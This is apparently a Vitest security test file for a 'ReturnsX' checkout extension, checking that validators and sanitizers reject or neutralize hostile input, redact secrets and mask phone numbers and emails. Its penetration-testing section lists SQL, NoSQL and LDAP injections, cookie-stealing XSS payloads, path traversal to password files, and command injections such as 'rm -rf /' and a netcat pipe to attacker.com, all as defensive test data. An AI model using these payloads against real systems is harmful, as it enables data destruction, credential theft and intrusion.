/**
 * Security Validation Tests for ReturnsX Thank You Page Extension
 * 
 * These tests validate the security implementations without complex mocking:
 * - Input validation security
 * - XSS prevention
 * - Error handling security
 * - Data sanitization
 */

import { describe, it, expect } from 'vitest';
import { 
  validateCustomerData, 
  validateRiskProfileResponse,
  validateExtensionConfig,
  validatePhoneNumber,
  validateEmail 
} from '../utils/validation';
import { 
  sanitizeHtml, 
  sanitizeText, 
  sanitizeErrorMessage,
  sanitizeDebugInfo,
  sanitizeCustomMessage,
  sanitizePhoneForDisplay,
  sanitizeEmailForDisplay 
} from '../utils/sanitization';

describe('Security Validation Tests', () => {
  describe('Input Validation Security', () => {
    it('should validate customer data structure correctly', () => {
      const validData = {
        phone: '+923001234567',
        email: 'test@example.com',
        orderId: '12345'
      };

      const result = validateCustomerData(validData);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.sanitized).toBeDefined();
    });

    it('should reject invalid phone numbers', () => {
      const testCases = [
        'invalid-phone',
        '123',
        'abc123',
        '+92300123456789012345', // Too long
        '+1234567890123456789', // Too long
        '\'; DROP TABLE users; --', // SQL injection attempt
        '<script>alert("xss")</script>', // XSS attempt
      ];

      testCases.forEach(phone => {
        const result = validatePhoneNumber(phone);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    it('should reject invalid email addresses', () => {
      const testCases = [
        'invalid-email',
        '@example.com',
        'test@',
        'test..test@example.com',
        'test@example',
        'a'.repeat(255) + '@example.com', // Too long
        'test@example.com; DROP TABLE users;', // SQL injection
        '<script>alert("xss")</script>@example.com', // XSS
      ];

      testCases.forEach(email => {
        const result = validateEmail(email);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    it('should validate API response structure', () => {
      const validResponse = {
        success: true,
        riskTier: 'MEDIUM_RISK',
        riskScore: 50,
        totalOrders: 10,
        failedAttempts: 2,
        successfulDeliveries: 8,
        isNewCustomer: false,
        message: 'Medium risk customer'
      };

      const result = validateRiskProfileResponse(validResponse);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject malformed API responses', () => {
      const invalidResponses = [
        {
          success: true,
          riskTier: 'INVALID_TIER', // Invalid enum
          riskScore: 50,
          totalOrders: 10,
          failedAttempts: 2,
          successfulDeliveries: 8,
          isNewCustomer: false,
          message: 'Test'
        },
        {
          success: true,
          riskTier: 'MEDIUM_RISK',
          riskScore: 150, // Out of range
          totalOrders: 10,
          failedAttempts: 2,
          successfulDeliveries: 8,
          isNewCustomer: false,
          message: 'Test'
        },
        {
          success: true,
          riskTier: 'MEDIUM_RISK',
          riskScore: 50,
          totalOrders: -1, // Negative value
          failedAttempts: 2,
          successfulDeliveries: 8,
          isNewCustomer: false,
          message: 'Test'
        },
        {
          success: true,
          riskTier: 'MEDIUM_RISK',
          riskScore: 50,
          totalOrders: 10,
          failedAttempts: 2,
          successfulDeliveries: 8,
          isNewCustomer: false,
          message: '' // Empty message
        }
      ];

      invalidResponses.forEach(response => {
        const result = validateRiskProfileResponse(response);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    it('should validate extension configuration', () => {
      const validConfig = {
        api_endpoint: 'https://api.returnsx.com',
        api_timeout: 5,
        whatsapp_enabled: true,
        whatsapp_phone: '+923001234567',
        whatsapp_message_template: 'Hello, your order {orderNumber} needs attention.'
      };

      const result = validateExtensionConfig(validConfig);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject insecure configuration', () => {
      const insecureConfigs = [
        {
          api_endpoint: 'http://insecure.com', // HTTP instead of HTTPS
          api_timeout: 5
        },
        {
          api_endpoint: 'https://api.returnsx.com',
          api_timeout: 100 // Too long
        },
        {
          api_endpoint: 'https://api.returnsx.com',
          whatsapp_enabled: true,
          whatsapp_phone: 'invalid-phone' // Invalid phone
        }
      ];

      insecureConfigs.forEach(config => {
        const result = validateExtensionConfig(config);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize HTML content', () => {
      const testCases = [
        {
          input: '<script>alert("xss")</script><p>Safe content</p>',
          shouldNotContain: ['<script>', 'alert'],
          shouldContain: ['Safe content']
        },
        {
          input: '<img src="x" onerror="alert(1)">Image',
          shouldNotContain: ['<img', 'onerror', 'alert'],
          shouldContain: ['Image']
        },
        {
          input: '<a href="javascript:alert(1)">Link</a>',
          shouldNotContain: ['<a', 'javascript:', 'alert'],
          shouldContain: ['Link']
        }
      ];

      testCases.forEach(testCase => {
        const sanitized = sanitizeHtml(testCase.input);
        
        testCase.shouldNotContain.forEach(forbidden => {
          expect(sanitized).not.toContain(forbidden);
        });
        
        testCase.shouldContain.forEach(required => {
          expect(sanitized).toContain(required);
        });
      });
    });

    it('should escape HTML entities', () => {
      const input = 'Test & <script>alert("xss")</script> content';
      const sanitized = sanitizeHtml(input);
      
      expect(sanitized).toContain('&amp;');
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
      expect(sanitized).toContain('&quot;');
      expect(sanitized).not.toContain('<script>');
    });

    it('should sanitize custom messages from merchants', () => {
      const maliciousMessages = [
        '<img src="x" onerror="alert(1)">Hello customer!',
        '<script>document.cookie="stolen="+document.cookie</script>Welcome!',
        '<iframe src="javascript:alert(1)"></iframe>Thank you!',
        'Hello <svg onload="alert(1)">customer!'
      ];

      maliciousMessages.forEach(message => {
        const sanitized = sanitizeCustomMessage(message);
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('alert');
      });
    });

    it('should remove control characters', () => {
      const input = 'Normal text\x00\x01\x02\x08\x0B\x0C\x0E\x1F\x7Fwith control chars';
      const sanitized = sanitizeText(input);
      
      expect(sanitized).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/);
      expect(sanitized).toContain('Normal text');
      expect(sanitized).toContain('with control chars');
    });

    it('should limit message length to prevent DoS', () => {
      const longMessage = 'A'.repeat(1000);
      const sanitized = sanitizeCustomMessage(longMessage, 100);
      
      expect(sanitized.length).toBeLessThanOrEqual(100);
      expect(sanitized).toEndWith('...');
    });
  });

  describe('Error Handling Security', () => {
    it('should sanitize error messages', () => {
      const sensitiveErrors = [
        'Authentication failed with token abc123xyz',
        'Database error: password=secret123',
        'API key invalid: key=sk_live_123456789',
        'Bearer token expired: bearer abc123def456',
        'Authorization header missing: authorization=Basic dGVzdA=='
      ];

      sensitiveErrors.forEach(error => {
        const sanitized = sanitizeErrorMessage(error);
        
        expect(sanitized).not.toContain('abc123xyz');
        expect(sanitized).not.toContain('secret123');
        expect(sanitized).not.toContain('sk_live_123456');
        expect(sanitized).not.toContain('abc123def456');
        expect(sanitized).not.toContain('dGVzdA==');
        expect(sanitized).toContain('[REDACTED]');
      });
    });

    it('should sanitize debug information', () => {
      const debugInfo = {
        request: {
          phone: '+923001234567',
          email: 'test@example.com',
          auth_token: 'secret-token',
          api_key: 'secret-key'
        },
        config: {
          password: 'secret-password',
          secret: 'top-secret',
          authorization: 'Bearer token123'
        },
        user: {
          customer_id: 'cust_123456'
        }
      };

      const sanitized = sanitizeDebugInfo(debugInfo);
      
      expect(sanitized.request.phone).toBe('[REDACTED]');
      expect(sanitized.request.email).toBe('[REDACTED]');
      expect(sanitized.request.auth_token).toBe('[REDACTED]');
      expect(sanitized.request.api_key).toBe('[REDACTED]');
      expect(sanitized.config.password).toBe('[REDACTED]');
      expect(sanitized.config.secret).toBe('[REDACTED]');
      expect(sanitized.config.authorization).toBe('[REDACTED]');
      expect(sanitized.user.customer_id).toBe('[REDACTED]');
    });

    it('should limit error message length', () => {
      const longError = 'A'.repeat(1000);
      const sanitized = sanitizeErrorMessage(longError);
      
      expect(sanitized.length).toBeLessThanOrEqual(200);
      expect(sanitized).toEndWith('...');
    });

    it('should handle nested sensitive data in debug info', () => {
      const nestedDebugInfo = {
        user: {
          profile: {
            phone: '+923001234567',
            credentials: {
              token: 'secret-token',
              api_key: 'secret-api-key'
            }
          }
        },
        config: {
          auth: {
            password: 'nested-password'
          }
        }
      };

      const sanitized = sanitizeDebugInfo(nestedDebugInfo);
      
      expect(sanitized.user.profile.phone).toBe('[REDACTED]');
      expect(sanitized.user.profile.credentials.token).toBe('[REDACTED]');
      expect(sanitized.user.profile.credentials.api_key).toBe('[REDACTED]');
      expect(sanitized.config.auth.password).toBe('[REDACTED]');
    });
  });

  describe('Data Privacy Protection', () => {
    it('should mask phone numbers for display', () => {
      const testCases = [
        { input: '+923001234567', expected: /^\+92\*+4567$/ },
        { input: '03001234567', expected: /^\*+4567$/ },
        { input: '1234567890', expected: /^\*+7890$/ },
        { input: '123', expected: '***' }
      ];

      testCases.forEach(testCase => {
        const masked = sanitizePhoneForDisplay(testCase.input);
        if (typeof testCase.expected === 'string') {
          expect(masked).toBe(testCase.expected);
        } else {
          expect(masked).toMatch(testCase.expected);
        }
      });
    });

    it('should mask email addresses for display', () => {
      const testCases = [
        { input: 'test@example.com', expected: /^te\*+st@\*+\.com$/ },
        { input: 'a@b.co', expected: /^a@\*+\.co$/ },
        { input: 'long.email.address@domain.com', expected: /^lo\*+ss@\*+\.com$/ },
        { input: 'invalid-email', expected: '***@***.***' }
      ];

      testCases.forEach(testCase => {
        const masked = sanitizeEmailForDisplay(testCase.input);
        if (typeof testCase.expected === 'string') {
          expect(masked).toBe(testCase.expected);
        } else {
          expect(masked).toMatch(testCase.expected);
        }
      });
    });
  });

  describe('Penetration Testing Scenarios', () => {
    it('should resist SQL injection attempts in customer data', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE customers; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM passwords --"
      ];

      sqlInjectionAttempts.forEach(attempt => {
        const phoneResult = validatePhoneNumber(attempt);
        const emailResult = validateEmail(attempt + '@example.com');
        
        expect(phoneResult.isValid).toBe(false);
        expect(emailResult.isValid).toBe(false);
      });
    });

    it('should resist XSS attempts in custom messages', () => {
      const xssAttempts = [
        '<script>document.cookie="stolen="+document.cookie</script>',
        '<img src="x" onerror="fetch(\'/steal?data=\'+document.cookie)">',
        '<svg onload="eval(atob(\'YWxlcnQoMSk=\'))">',
        'javascript:alert(document.domain)',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      xssAttempts.forEach(attempt => {
        const sanitized = sanitizeCustomMessage(attempt);
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('eval');
        expect(sanitized).not.toContain('atob');
      });
    });

    it('should resist LDAP injection in email validation', () => {
      const ldapInjections = [
        'test@example.com)(|(password=*))',
        'test@example.com)(|(uid=*))',
        'test@example.com)(&(password=*)(uid=admin))'
      ];

      ldapInjections.forEach(injection => {
        const result = validateEmail(injection);
        expect(result.isValid).toBe(false);
      });
    });

    it('should resist command injection in phone numbers', () => {
      const commandInjections = [
        '+92300123456; rm -rf /',
        '+92300123456 && cat /etc/passwd',
        '+92300123456 | nc attacker.com 4444',
        '+92300123456`whoami`'
      ];

      commandInjections.forEach(injection => {
        const result = validatePhoneNumber(injection);
        expect(result.isValid).toBe(false);
      });
    });

    it('should resist prototype pollution attempts', () => {
      const pollutionAttempt = {
        phone: '+923001234567',
        '__proto__': { isAdmin: true },
        'constructor': { prototype: { isAdmin: true } },
        'prototype': { isAdmin: true }
      };

      const result = validateCustomerData(pollutionAttempt);
      
      // Should only validate known fields
      expect(result.sanitized).not.toHaveProperty('__proto__');
      expect(result.sanitized).not.toHaveProperty('constructor');
      expect(result.sanitized).not.toHaveProperty('prototype');
      
      // Should still validate the legitimate phone field
      if (result.isValid) {
        expect(result.sanitized).toHaveProperty('phone');
      }
    });

    it('should resist NoSQL injection attempts', () => {
      const nosqlInjections = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}'
      ];

      nosqlInjections.forEach(injection => {
        const phoneResult = validatePhoneNumber(injection);
        const emailResult = validateEmail(injection + '@example.com');
        
        expect(phoneResult.isValid).toBe(false);
        expect(emailResult.isValid).toBe(false);
      });
    });

    it('should resist path traversal attempts', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      pathTraversals.forEach(traversal => {
        const phoneResult = validatePhoneNumber(traversal);
        const emailResult = validateEmail(traversal + '@example.com');
        
        expect(phoneResult.isValid).toBe(false);
        expect(emailResult.isValid).toBe(false);
      });
    });
  });
});